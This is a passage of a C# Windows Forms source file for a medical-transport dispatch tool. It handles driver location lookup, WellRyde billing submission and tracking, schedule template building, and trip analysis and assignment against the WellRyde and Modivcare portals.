        /// <summary>
        /// Right-click → Locate driver on map. Pulls the selected trip's driver name + portal id
        /// (best-effort cross-reference into the cached driver roster), then opens
        /// <see cref="DriverLocationMapForm"/> as a non-modal popup so the user can keep working
        /// in the listview while the map is open.
        /// </summary>
        private async void tsTripCtxLocate_Click(object sender, EventArgs e)
        {
            var selected = GetSelectedTripScoutTrips();
            if (selected.Count != 1)
            {
                MessageBox.Show("Pick exactly one trip to locate its driver.", "Trip Scout",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            var trip = selected[0];
            if (string.IsNullOrWhiteSpace(trip.DriverName))
            {
                MessageBox.Show("That trip has no driver assigned.", "Trip Scout",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
            {
                MessageBox.Show("WellRyde portal session is not available.", "Trip Scout",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            // The AVL feed keys on driverid (e.g. "SEC-u-..."), which the trip row doesn't carry.
            // Reuse the cached roster to translate name → id; it's a single round-trip per session.
            string driverId = await ResolveDriverIdForLocateAsync(trip.DriverName).ConfigureAwait(true);

            // Pass the day's full trip list so the popup can show every trip already assigned to
            // this driver — dispatch needs to see in-progress vs. upcoming to estimate ETAs over
            // the phone. Snapshot via ToList so subsequent loads in Trip Scout don't mutate the
            // list under the popup.
            var dayTrips = _tripScoutAllTrips != null
                ? new List<WRDownloadedTrip>(_tripScoutAllTrips)
                : new List<WRDownloadedTrip>();

            // Always spin up a fresh popup so the trip snapshot reflects the latest Trip Scout
            // load. A previous popup with a stale trip list would otherwise stay docked.
            if (_driverLocationMap != null && !_driverLocationMap.IsDisposed)
            {
                try { _driverLocationMap.Close(); } catch { /* dispose race is harmless */ }
                _driverLocationMap = null;
            }
            _driverLocationMap = new DriverLocationMapForm(_wellRydeSession, driverId, trip.DriverName, dayTrips);
            _driverLocationMap.FormClosed += (_, __) => _driverLocationMap = null;
            _driverLocationMap.Show(this);
        }

        /// <summary>The currently open driver-location popup (non-modal); null when no map is shown.</summary>
        private DriverLocationMapForm _driverLocationMap;

        /// <summary>
        /// Translate a portal trip's <c>DriverName</c> to the driverid the AVL feed expects.
        /// Returns null if the roster isn't available; the popup will then fall back to name matching.
        /// </summary>
        private async Task<string> ResolveDriverIdForLocateAsync(string driverName)
        {
            if (string.IsNullOrWhiteSpace(driverName)) return null;
            try
            {
                if (_tripScoutDriverRoster == null || _tripScoutDriverRoster.Count == 0)
                {
                    _tripScoutDriverRoster = await _wellRydeSession.GetAllDriversForTripAssignmentAsync().ConfigureAwait(true);
                }
            }
            catch
            {
                return null;
            }
            if (_tripScoutDriverRoster == null) return null;

            string target = driverName.Trim();
            foreach (var d in _tripScoutDriverRoster)
            {
                if (d == null) continue;
                if (string.Equals(d.text, target, StringComparison.OrdinalIgnoreCase))
                    return d.value;
            }
            // Loose match: collapse whitespace.
            string normTarget = string.Join(" ", target.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
            foreach (var d in _tripScoutDriverRoster)
            {
                if (d == null || string.IsNullOrWhiteSpace(d.text)) continue;
                string normCandidate = string.Join(" ", d.text.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
                if (string.Equals(normCandidate, normTarget, StringComparison.OrdinalIgnoreCase))
                    return d.value;
            }
            return null;
        }

        /// <summary>Snapshot the underlying <see cref="WRDownloadedTrip"/>s for the user's selection.</summary>
        private List<WRDownloadedTrip> GetSelectedTripScoutTrips()
        {
            var result = new List<WRDownloadedTrip>();
            foreach (ListViewItem item in tslv.SelectedItems)
            {
                if (item?.Tag is WRDownloadedTrip trip) result.Add(trip);
            }
            return result;
        }

        /// <summary>Re-renders <see cref="tslv"/> after an in-memory mutation, preserving the active search filter.</summary>
        private void RefreshTripScoutListViewKeepingFilter()
        {
            ApplyTripScoutFilter(tssearchbox.Text);
        }

        /// <summary>
        /// Fills <see cref="tslv"/> from a Trip Scout-owned trip list. Each row's <see cref="ListViewItem.Tag"/>
        /// holds the originating <see cref="WRDownloadedTrip"/> so future actions can act on the underlying record.
        /// </summary>
        private void BindTripScoutListView(List<WRDownloadedTrip> trips, bool fitColumns = false)
        {
            try
            {
                tslv.BeginUpdate();
                tslv.Items.Clear();
                if (trips == null || trips.Count == 0)
                    return;

                foreach (WRDownloadedTrip trip in trips)
                {
                    ListViewItem item = new ListViewItem();
                    item.Tag = trip;
                    item.Text = trip.Status ?? "";
                    item.SubItems.Add(trip.TripNumber ?? "");
                    item.SubItems.Add(""); // alerts column hidden; keep index alignment
                    item.SubItems.Add(trip.ClientName ?? "");
                    item.SubItems.Add(trip.DriverName ?? "");
                    item.SubItems.Add(FormatTimeOnly(trip.PUTime ?? ""));
                    item.SubItems.Add(trip.PUStreet ?? "");
                    item.SubItems.Add(trip.PUCity ?? "");
                    item.SubItems.Add(FormatTimeOnly(trip.DOTime ?? ""));
                    item.SubItems.Add(trip.DOStreet ?? "");
                    item.SubItems.Add(trip.DOCITY ?? "");
                    item.SubItems.Add(trip.Miles ?? "");
                    item.SubItems.Add("$" + (trip.Price ?? ""));
                    item.SubItems.Add(trip.References ?? "");
                    tslv.Items.Add(item);
                }
            }
            finally
            {
                tslv.EndUpdate();
            }
            if (fitColumns)
                ScheduleTripScoutColumnFit();
        }

        /// <summary>Runs after the Trip Scout list handle is ready and layout has settled.</summary>
        private void ScheduleTripScoutColumnFit()
        {
            if (tslv == null || tslv.IsDisposed) return;
            void fit()
            {
                if (tslv.IsDisposed || !tslv.IsHandleCreated) return;
                // Use our enforcer's batched recompute (single redraw pass). Native
                // AutoResizeColumns visibly walks columns one-by-one in Trip Scout.
                ListViewMinWidthEnforcer.Recompute(tslv);
                if (tsColAlerts != null)
                    tsColAlerts.Width = 0;
                tslv.Invalidate(true);
            }
            if (tslv.InvokeRequired)
                tslv.BeginInvoke((MethodInvoker)fit);
            else
                tslv.BeginInvoke((MethodInvoker)fit);
        }

        /// <summary>
        /// Fills <see cref="billinglistview"/> from <see cref="WRBillingTool.WRTripList"/> / <see cref="WRBillingTool.WRCalculations"/>.
        /// </summary>
        private void BindBillingListViewFromWrTool(decimal totalbilled, bool billinprogress, bool billexrta)
        {
            if (wrBillingTool?.WRTripList == null || wrBillingTool.WRCalculations == null)
                return;

            try
            {
                Dictionary<WRDownloadedTrip, WRDownloadedTrip> mismatchtrips = wrBillingTool.FindTripPriceMismatches();
                billinglistview.Items.Clear();
                foreach (WRDownloadedTrip trip in wrBillingTool.WRTripList)
                {
                    string alertseries = "";
                    foreach (string alert in trip.Alerts)
                    {
                        if (alertseries != "")
                            alertseries = alertseries + ", " + alert;
                        else
                            alertseries = alert;
                    }

                    ListViewItem item = new ListViewItem();
                    item.Tag = trip;
                    item.Text = trip.Status;
                    item.SubItems.Add(trip.TripNumber);
                    item.SubItems.Add(alertseries);
                    item.SubItems.Add(trip.ClientName);
                    item.SubItems.Add(trip.DriverName);
                    item.SubItems.Add(FormatTimeOnly(trip.PUTime));
                    item.SubItems.Add(FormatTimeOnly(trip.DOTime));
                    item.SubItems.Add(trip.PUStreet);
                    item.SubItems.Add(trip.PUCity);
                    item.SubItems.Add(trip.DOStreet);
                    item.SubItems.Add(trip.DOCITY);
                    item.SubItems.Add(trip.Miles);
                    item.SubItems.Add("$" + trip.Price);
                    item.SubItems.Add(trip.References);
                    billinglistview.Items.Add(item);
                    foreach (KeyValuePair<WRDownloadedTrip, WRDownloadedTrip> mmtrip in mismatchtrips)
                    {
                        if (mmtrip.Key.TripNumber == trip.TripNumber)
                            item.BackColor = Color.OrangeRed;
                    }
                }
                if (_billingSubmitPending && _lastBillingSubmitCount > 0)
                {
                    SetBillingStatusLabel(BuildBillingSubmitStatusMessage(billed_trips_counter));
                }
                else
                {
                    int billableCount = wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState);
                    decimal billableTotal = wrBillingTool.WRCalculations.CalculateActualBillTotal(billingmmcb.CheckState, billingallcb.CheckState);
                    string loaded = "Status: " + wrBillingTool.WRTripList.Count + " trips loaded for " + rjDatePicker1.Value.ToLongDateString()
                        + ". " + billableCount + " billable ($" + billableTotal.ToString("N2") + ").";
                    if (billableCount > 0)
                        loaded += " Click 'SUBMIT' to submit.";
                    SetBillingStatusLabel(loaded);
                }
                billinglistview.Columns[2].Text = "Alerts: " + wrBillingTool.WRCalculations.GetAlertCount().ToString();
            }
            catch (Exception) { }
            ListViewMinWidthEnforcer.ScheduleRecompute(billinglistview);
            wrBillingTool.WRCalculations.CheckIfAllTripsAreBeingBilled(billingmmcb.CheckState, billingallcb.CheckState);
            RefreshBillingCharts();
        }

        private void BillingOptions_ChangedRefreshCharts(object sender, EventArgs e)
        {
            if (wrBillingTool?.WRTripList == null || wrBillingTool.WRTripList.Count == 0)
                return;
            RefreshBillingCharts();
        }

        private List<BillableTrip> billedtrips = new List<BillableTrip>();
        private int _lastBillingSubmitCount;
        private decimal _lastBillingSubmitDollars;
        private bool _billingSubmitPending;
        private async Task populateBillingList(decimal totalbilled, bool billinprogress, bool billexrta)
        {
            try
            {
                var (reloadResult, _) = await ReloadBillingTripsFromPortalWithAuthRetryAsync();
                if (!reloadResult.IsSuccess)
                    Console.WriteLine("Billing list refresh: " + (reloadResult.ErrorMessage ?? "filterdata failed."));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Billing list refresh: " + ex.Message);
            }

            Console.WriteLine(rjDatePicker1.Value.ToLongDateString());
            BindBillingListViewFromWrTool(totalbilled, billinprogress, billexrta);
        }
        private async void billsubmitbtn_Click(object sender, EventArgs e)
        {
            loadinggifhandler_showscreen();
            
            //billtimer.Enabled = true;
            bool billall = false;
            
            if (billingallcb.CheckState == CheckState.Checked)
            {
                await SetLoadingGifLabel("Using the bill all feature will bill trips drivers are still on. Continue?");
                DialogResult dialogResult = MessageBox.Show("Selecting 'Bill All' can result in billing trips that drivers are still on. Continue?", "Warning!", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    billall = true;
                }
                else if (dialogResult == DialogResult.No)
                {
                    await SetLoadingGifLabel("Cancelling bill submit");
                    loadinggifhandler_hidescreen();
                    return;
                }
            }

            billtimer.Enabled = true;
            
            await SetLoadingGifLabel("Checking connections");
            try
            {
                if (!await EnsureWellRydePortalSessionForBillingAsync())
                {
                    loadinggifhandler_hidescreen();
                    return;
                }
                if (_wellRydeSession == null)
                {
                    MessageBox.Show("WellRyde portal session is not available. Sign in on the WellRyde tab and try again.");
                    loadinggifhandler_hidescreen();
                    return;
                }
                billedtrips = await wrBillingTool.SendBill(_wellRydeSession, billingmmcb.CheckState, billingallcb.CheckState);
                _lastBillingSubmitCount = billedtrips.Count;
                _lastBillingSubmitDollars = SumBillableTripAmounts(billedtrips);
                _billingSubmitPending = _lastBillingSubmitCount > 0;
                await SetLoadingGifLabel("Waiting for trips to arrive. 0 / " + billedtrips.Count + " trips billed..");
            }
            catch (NullReferenceException)
            {
                MessageBox.Show("You haven't loaded a list yet.");
                loadinggifhandler_hidescreen();
                return;
            }
            catch (InvalidOperationException ex)
            {
                MessageBox.Show("Billing submit failed: " + ex.Message);
                loadinggifhandler_hidescreen();
                return;
            }

            if (billedtrips.Count == 0)
            {
                await SetLoadingGifLabel("No billable trips detected.. Exiting");
                loadinggifhandler_hidescreen();
                //LoadingGifSkipBtn.Visible = false;
                return;
            }
            else
            {
                //loadinggifhandler_hidescreen();
                await populateBillingList(0, true, billall);
                RefreshBillingCharts();
                SetBillingStatusLabel(BuildBillingSubmitStatusMessage(0));
                billtimer.Start();
            }
            
        }

        int billed_trips_counter = 0;
        private async Task CheckForBillCompletion(List<BillableTrip> tripsbilled)
        {
            billed_trips_counter = 0;
            try
            {
                var (reloadResult, _) = await ReloadBillingTripsFromPortalWithAuthRetryAsync();
                if (!reloadResult.IsSuccess)
                    Console.WriteLine("Bill completion refresh: " + (reloadResult.ErrorMessage ?? "filterdata failed."));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Bill completion refresh: " + ex.Message);
            }

            bool found_trip_not_billed = false;
            int billable_trip_counter = tripsbilled.Count;
            
            foreach (BillableTrip bt in tripsbilled)
            {
                foreach (WRDownloadedTrip wrdt in wrBillingTool.WRTripList)
                {
                    if (wrdt.TripUUID == bt.tripUUID)
                    {
                        if (wrdt.Status != "Billed")
                        {
                            found_trip_not_billed = true;
                        }
                        else
                        {
                            billed_trips_counter++;
                        }
                    }
                }
            }

            await SetLoadingGifLabel("Waiting for trips to arrive. " + billed_trips_counter.ToString() + " / " + billable_trip_counter + " trips billed..");
            SetBillingStatusLabel(BuildBillingSubmitStatusMessage(billed_trips_counter));
            if (!found_trip_not_billed)
            {
                Console.WriteLine("Found all trips!");
                _billingSubmitPending = false;
                billtimer.Stop();
                int portalBilledCount = wrBillingTool.WRCalculations.CountBilledTrips();
                decimal portalBilledTotal = Math.Round(wrBillingTool.WRCalculations.CalculateBilledTotal(), 2, MidpointRounding.AwayFromZero);
                SetBillingStatusLabel(
                    "Status: All " + _lastBillingSubmitCount + " submitted trips ($" + _lastBillingSubmitDollars.ToString("N2") + ") are Billed on WellRyde. "
                    + portalBilledCount + " total Billed on portal ($" + portalBilledTotal.ToString("N2") + ").");
                RunOnUiThread(RefreshBillingCharts);
                loadinggifhandler_hidescreen();
            }
            else
            {
                Console.WriteLine("There were some trips not billed yet.");
                RunOnUiThread(RefreshBillingCharts);
            }
        }












        private void timekiller_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            timekiller.Stop();
        }
        private void hidegiftimer_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            LoadingGifSkipBtn.Visible = false;
            HideLoadingGif();
            hidegiftimer.Stop();
            
        }
        private async void billtimer_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            if (billedtrips.Count == 0)
            {
                loadinggifhandler_hidescreen();
                billtimer.Stop();
            }
            else
            {
                LoadingGifSkipBtn.Visible = true;
                await CheckForBillCompletion(billedtrips);
            }
        }
        private async Task SetLoadingGifLabel(string txt)
        {
            if (_applicationExitRequested)
                return;
            ApplyLoadingGifLabel(txt);
            await Task.Yield();
        }

        private void GifWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            ApplyLoadingGifLabel(e.Argument as string);
        }

































        private string splitwellrydename(string name)
        {

            string a = name.Substring(0, 1);
            string b = name.Substring(1, 5);

            string newname = char.ToUpper(a[0]) + " " + char.ToUpper(b[0]) + b.Substring(1);
            return newname;
        }



















        private string GetFilterDate()
        {
            //return string should be similar to "November+19%2C+2022"
            string finalmonth;

            //Get month as string
            string datefilter = rjDatePicker1.Value.ToLongDateString();
            //Console.WriteLine(datefilter);
            //Get month from between commas
            string monthandday = Regex.Match(datefilter, @"(?<=^([^,]*,){1})([^,]*)").Value;
            //Console.WriteLine(monthandday);
            //Get month from between spaces
            string actualmonth = Regex.Match(monthandday, @"(?<=^([^ ]* ){1})([^ ]*)").Value;
            finalmonth = actualmonth;
            //Console.WriteLine(actualmonth);
            //Get month complete

            //Console.WriteLine(finalmonth + "+" + dateTimePicker1.Value.Day + "%2C+" + dateTimePicker1.Value.Year);
            return finalmonth + "+" + rjDatePicker1.Value.Day + "%2C+" + rjDatePicker1.Value.Year;




        }
        private string GetCurrentDate()
        {
            //return string should be similar to "November+19%2C+2022"
            DateTime localDate = DateTime.Now;


            string month = DateTime.Now.ToString("MMMM");
            string day = DateTime.Now.ToString("dd");
            string year = DateTime.Now.ToString("yyyy");
            Console.WriteLine(month + "+" + day + "%2C+" + year);
            return month + "+" + day + "%2C+" + year;
        }
        public string SplitDriverName(string driverrname)
        {
            string[] uncleanfirstandlast = driverrname.Split(new string[] { "," }, StringSplitOptions.None);
            string firstname = uncleanfirstandlast[0].Replace(" ", "");
            string firstnameafter = char.ToUpper(firstname.First()) + firstname.Substring(1).ToLower();

            string[] uncleanlast = uncleanfirstandlast[1].Split(' ');
            string lastname = uncleanlast[1].Replace(" ", "");
            string lastnameafter = char.ToUpper(lastname.First()) + lastname.Substring(1).ToLower();

            return lastnameafter + " " + firstnameafter;
        }

        //templates
        private async void addtemplatebtn_Click(object sender, EventArgs e)
        {
            loadinggifhandler_showscreen();
            await SetLoadingGifLabel("Starting template builder…");

            if (string.IsNullOrWhiteSpace(tbcb.Text))
            {
                MessageBox.Show(
                    this,
                    "Choose the weekday (Monday through Sunday) in the list at the top of this tab before adding a template.\n\n" +
                    "That tells the app which folder to save the driver CSV files into (for example, the Monday folder).",
                    "Templates",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                loadinggifhandler_hidescreen();
                return;
            }

            await SetLoadingGifLabel("Select a schedule file for templates");
            OpenFileDialog openFileDialog1 = new OpenFileDialog
            {
                InitialDirectory = System.Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Title = "Choose a schedule workbook to turn into templates",

                CheckFileExists = true,
                CheckPathExists = true,

                DefaultExt = ".xlsx",
                Filter = "workbook files (*.xlsx)|*.xlsx",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                tbuilder.TargetWeekdayName = tbcb.Text.Trim();
                tbuilder.TemplateNameOfFileToLoad = openFileDialog1.FileName;
                await SetLoadingGifLabel("Exporting tabs to CSV and validating layout…");
                tbuilder.StartTemplateBuilder();

                if (tbuilder.BadScheduleScan)
                {
                    await SetLoadingGifLabel("Validation failed");
                    loadinggifhandler_hidescreen();
                    tbstatuslbl.Text = "Status: Fix the issues in the message, then try Add Template again.";
                    MessageBox.Show(this, tbuilder.FormatBadScheduleUserMessage(), "Template validation", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    tbuilder.ClearTemplateWorkingFolder();
                    return;
                }

                if (string.IsNullOrWhiteSpace(tbuilder.TemplateNameOfDay))
                {
                    await SetLoadingGifLabel("Could not determine save folder");
                    loadinggifhandler_hidescreen();
                    tbstatuslbl.Text = "Status: Pick a weekday on this tab, then try again.";
                    MessageBox.Show(
                        this,
                        "The app could not confirm which weekday folder to use.\n\n" +
                        "Make sure a day (Monday–Sunday) is selected above, then run Add Template again.",
                        "Templates",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    tbuilder.ClearTemplateWorkingFolder();
                    return;
                }

                var replaced = await tbuilder.TryRunReplaceTemplatesDialogAsync(this);
                if (!replaced)
                {
                    loadinggifhandler_hidescreen();
                    tbstatuslbl.Text = "Status: Template replace was cancelled; working files were cleared.";
                    return;
                }

                if (tbuilder.ScheduleWeekdayMismatchWarning && !string.IsNullOrEmpty(tbuilder.InferredWeekdayFromSchedule))
                {
                    MessageBox.Show(
                        this,
                        "Trip dates in this workbook repeat like a " + tbuilder.InferredWeekdayFromSchedule +
                        " schedule, but you had selected " + tbuilder.TargetWeekdayName +
                        " on the Templates tab.\n\n" +
                        "Files were saved under the folder for " + tbuilder.TargetWeekdayName +
                        ".\n\nIf that is wrong, select the correct weekday and run Add Template again with the same file.",
                        "Weekday check",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                }

                for (int i = 0; i < tbcb.Items.Count; i++)
                {
                    string value = tbcb.GetItemText(tbcb.Items[i]);
                    try
                    {
                        if (value.Contains(tbuilder.TemplateNameOfDay))
                        {
                            tbtemplatenamecb.Items.Clear();
                            templatelv.Items.Clear();
                            try
                            {
                                tbcb.SelectedIndex = i + 1;
                            }
                            catch
                            {
                                tbcb.SelectedIndex = i - 1;
                            }

                            tbcb.SelectedIndex = i;
                            tbcb.Text = value;
                        }
                    }
                    catch (Exception)
                    {
                    }
                }

                tbstatuslbl.Text = "Status: Templates saved for " + tbuilder.TemplateNameOfDay + ".";
                loadinggifhandler_hidescreen();
            }
            else
            {
                await SetLoadingGifLabel("Cancelled");
                loadinggifhandler_hidescreen();
            }
        }

        //Auto Ass
        private async void aaloadbtn_Click(object sender, EventArgs e)
        {
            StartAnalyzerStatusSpinner("Status: Checking connections...");
            try
            {
                if (await EnsureWellRydePortalSessionForBillingAsync())
                    analyzer.SetWellRydePortalSession(_wellRydeSession);
                else
                    analyzer.SetWellRydePortalSession(null);
                if (!await EnsureModivcareSessionAsync())
                    return;

                analyzer.IntializeAnalyzer(mcLoginHandler);
                await analyzer.StartAnalysis(aadatepicker.Value.ToLongDateString(), aadatepicker.Value.Day, aadatepicker.Value.Year, aadatepicker.Value);
                UpdateAnalyzerStatus("Status: Please choose a schedule to analyze.");

                OpenFileDialog openFileDialog1 = new OpenFileDialog
                {
                    InitialDirectory = @"C:\Users\rneal\OneDrive\Desktop",
                    Title = "Browse Schedule Files",
                    CheckFileExists = true,
                    CheckPathExists = true,
                    DefaultExt = ".xlsx",
                    Filter = "workbook files (*.xlsx)|*.xlsx",
                    FilterIndex = 2,
                    RestoreDirectory = true
                };

                if (openFileDialog1.ShowDialog() != DialogResult.OK)
                {
                    StopAnalyzerStatusSpinner("Status: Select a date and click 'Load Schedule' when ready.");
                    return;
                }

                UpdateAnalyzerStatus("Status: Splitting schedule...");
                aalv.Items.Clear();

                try
                {
                    await analyzer.SplitFile(AppContext.BaseDirectory, openFileDialog1.FileName);
                }
                catch (ScheduleLoadException ex)
                {
                    MessageBox.Show(
                        "Schedule load failed. Fix the problem in your Excel file and try again.\n\n" + ex.Message,
                        "Schedule Load Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    StopAnalyzerStatusSpinner("Status: Schedule load failed. See message for details.");
                    return;
                }
                catch (Exception ex)
                {
                    MessageBox.Show(
                        "Unexpected error while loading/splitting the schedule.\n\n" + ex.Message,
                        "Schedule Load Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    StopAnalyzerStatusSpinner("Status: Schedule load failed.");
                    return;
                }

                UpdateAnalyzerStatus("Status: Analyzing schedule...");
                try
                {
                    analyzer.AnalyzeTrips(aadatepicker.Value);
                }
                catch (ScheduleAnalysisException ex)
                {
                    MessageBox.Show(
                        "Analysis failed. Check the schedule or trip data and try again.\n\n" + ex.Message,
                        "Analysis Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    StopAnalyzerStatusSpinner("Status: Analysis failed. See message for details.");
                    return;
                }
                catch (Exception ex)
                {
                    MessageBox.Show(
                        "Unexpected error during analysis.\n\n" + ex.Message,
                        "Analysis Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    StopAnalyzerStatusSpinner("Status: Analysis failed.");
                    return;
                }

                foreach (MCDownloadedTrip loggedtrip in analyzer.loggedScheduleTrips)
                {
                    bool reservecancel = false;
                    if (loggedtrip.DriverNameParsed == "Reserves")
                    {
                        if (loggedtrip.GetAlerts().Contains("Cancelled"))
                        {
                            reservecancel = true;
                        }
                    }
                    if (!reservecancel)
                    {
                        ListViewItem lvi = new ListViewItem();
                        lvi.Text = loggedtrip.TripNumber;
                        lvi.SubItems.Add(loggedtrip.Date);
                        lvi.SubItems.Add(loggedtrip.GetAlerts());
                        lvi.SubItems.Add(loggedtrip.DriverNameParsed);
                        lvi.SubItems.Add(loggedtrip.ClientFullName);
                        lvi.SubItems.Add(FormatTimeOnly(loggedtrip.PUTime));
                        lvi.SubItems.Add(loggedtrip.PUStreet);
                        lvi.SubItems.Add(loggedtrip.PUCity);
                        lvi.SubItems.Add(loggedtrip.PUTelephone);
                        lvi.SubItems.Add(FormatTimeOnly(loggedtrip.DOTime));
                        lvi.SubItems.Add(loggedtrip.DOStreet);
                        lvi.SubItems.Add(loggedtrip.DOCITY);
                        lvi.SubItems.Add(loggedtrip.DOTelephone);
                        lvi.SubItems.Add(loggedtrip.Comments);
                        lvi.BackColor = loggedtrip.GetColor();
                        aalv.Items.Add(lvi);
                    }
                }

                ListViewMinWidthEnforcer.ScheduleRecompute(aalv);
                reportCard = new ReportCard(hiatmeTabControl.SelectedTab, aaassbtn);
                reportCard.StartReport(analyzer.gradeList);

                UpdateAnalyzerStatus("Status: Analysis complete. Loading report card...");
                aalv.Columns[2].Text = "Alerts: " + analyzer.ReturnAlertCount().ToString();
                int assignPreview = analyzer.GetPlannedWellRydeAssignSlotCount();
                StopAnalyzerStatusSpinner("Status: Analysis completed with " + analyzer.ReturnAlertCount().ToString() + " alerts. Assign preview: " + assignPreview.ToString() + " trip(s) matched WellRyde for ASSIGN. Re-analyze after schedule changes.");
            }
            finally
            {
                StopAnalyzerStatusSpinner(keepCurrentText: true);
            }
        }
        private async void aaassbtn_Click(object sender, EventArgs e)
        {
            StartAnalyzerStatusSpinner("Status: Preparing to assign trips...");
            try
            {
                DialogResult dialogResult = MessageBox.Show("Are you sure you want to assign trips?", "Assign Trips", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    //do something
                    aastatuslbl.Text = "Status: Preparing to assign trips..";
                    if (analyzer.drivertablist == null)
                    {
                        StopAnalyzerStatusSpinner("Status: Select a date and click 'Load Schedule' or assign trips when ready.");
                        MessageBox.Show("You must load a schedule to continue.");
                        return;
                    }
                    UpdateAnalyzerStatus("Status: Checking WellRyde connection...");
                    if (await EnsureWellRydePortalSessionForBillingAsync())
                        analyzer.SetWellRydePortalSession(_wellRydeSession);
                    else
                        analyzer.SetWellRydePortalSession(null);
                    await analyzer.StartTripAssigning(aadatepicker.Value.ToLongDateString(), aadatepicker.Value.Day, aadatepicker.Value.Year, aadatepicker.Value);
                }
                else if (dialogResult == DialogResult.No)
                {
                    //do something else
                    StopAnalyzerStatusSpinner("Status: Select a date and click 'Load Schedule' or assign trips when ready.");
                    return;
                }
            }

            catch (Exception)
            {
                StopAnalyzerStatusSpinner("Status: Assign step failed.");
            }
            UpdateAnalyzerStatus("Status: Finalizing process...");
            var baseMsg = "Status: Assign step finished — WellRyde list shows " + analyzer.GetAssignedTripCount().ToString() + " Assigned and " + analyzer.GetReservedTripCount().ToString() + " Reserved.";
            if (!Analyzer.WellRydePortalAssignAndUnassignCallsServer)
                StopAnalyzerStatusSpinner(baseMsg + " Assign/unassign from this button does not change the portal yet; assign in the browser if needed.");
            else
                StopAnalyzerStatusSpinner(baseMsg);
        }
        private async void aareservesbtn_Click(object sender, EventArgs e)
        {
            StartAnalyzerStatusSpinner("Status: Checking connections...");
            if (await EnsureWellRydePortalSessionForBillingAsync())
                analyzer.SetWellRydePortalSession(_wellRydeSession);
            else
                analyzer.SetWellRydePortalSession(null);
            if (!await EnsureModivcareSessionAsync())
            {
                StopAnalyzerStatusSpinner("Status: Could not connect to Modivcare.");
                return;
            }
            analyzer.IntializeAnalyzer(mcLoginHandler);

            await analyzer.PullReserves(aadatepicker.Value.ToLongDateString(), aadatepicker.Value.Day, aadatepicker.Value.Year, aadatepicker.Value);
            StopAnalyzerStatusSpinner("Status: Reserve pull finished.");
        }

        //Employee Production

        private EmployeeStatManager EmployeeTable { get; set; }
        public async void CreateEmployeeStatTable()
        {
            _employeeStatsLoadCts?.Cancel();
            _employeeStatsLoadCts?.Dispose();
            _employeeStatsLoadCts = new CancellationTokenSource();
            var loadToken = _employeeStatsLoadCts.Token;
            EmployeeStatManager manager = null;
            try
            {
                empStatManager = new EmployeeStatManager(tabPage8, mcLoginHandler);
                manager = empStatManager;
                manager.PushLoadingOverlay("Checking connections...");

                WellRydePortalSession wrSession = null;
                manager.SetLoadingOverlayMessage("Connecting to WellRyde...");
                if (await EnsureWellRydePortalSessionForBillingAsync())
                    wrSession = _wellRydeSession;
                manager.SetLoadingOverlayMessage("Connecting to Modivcare...");
                if (!await EnsureModivcareSessionAsync())
                    return;
                manager.SetLoadingOverlayMessage("Loading Production dashboard...");
                await empStatManager.InitializeEmployeeDler(this, wrSession, null, loadToken);
            }
            catch (OperationCanceledException)
            {
                // Newer tab visit or form close cancelled this load.
            }
            finally
            {
                manager?.PopLoadingOverlay();
            }
        }






        private void loadinggifhandler_update(string text)
        {
            ApplyLoadingGifLabel(text);
        }
        private void loadinggifhandler_showscreen()
        {
            ShowLoadingGif();
        }
        private void loadinggifhandler_hidescreen()
        {
            hidegiftimer.Start();
        }
        private void LoadingGifSkipBtn_Click(object sender, EventArgs e)
        {
            ApplyLoadingGifLabel("Skipping…");
            billtimer.Stop();
            loadinggifhandler_hidescreen();
            //LoadingGifSkipBtn.Visible = false;
        }















        public void ShowLoadingGif()
        {
            if (hiatmeTabControl == null || hiatmeTabControl.TabCount == 0 || IsDisposed)
                return;
            int idx = hiatmeTabControl.SelectedIndex;
            if (idx < 0)
                idx = 0;
            if (idx >= hiatmeTabControl.TabCount)
                idx = hiatmeTabControl.TabCount - 1;
            LoadingGifCard.Parent = hiatmeTabControl.TabPages[idx];
            LoadingGifCard.BringToFront();
            LoadingGifCard.Dock = DockStyle.Fill;
            LoadingGifCard.BackColor = Color.Black;
            LoadingGifCard.Visible = true;
        }

        public void HideLoadingGif()
        {
            if (IsDisposed)
                return;
            try
            {
                LoadingGifCard.Visible = false;
                if (hiatmeTabControl?.SelectedTab == tabPage1)
                    pictureBox1?.Invalidate();
            }
            catch (ObjectDisposedException)
            {
                // ignore
            }
        }

        /// <summary>Updates the loading overlay caption from any thread; avoids BackgroundWorker and multi-second artificial delays.</summary>
        private void ApplyLoadingGifLabel(string txt)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            try
            {
                var text = txt ?? string.Empty;
                if (LoadingGifLabel == null)
                    return;
                if (LoadingGifLabel.InvokeRequired)
                    LoadingGifLabel.BeginInvoke((MethodInvoker)(() =>
                    {
                        if (!IsDisposed && LoadingGifLabel != null && !LoadingGifLabel.IsDisposed)
                            LoadingGifLabel.Text = text;
                    }));
                else if (!LoadingGifLabel.IsDisposed)
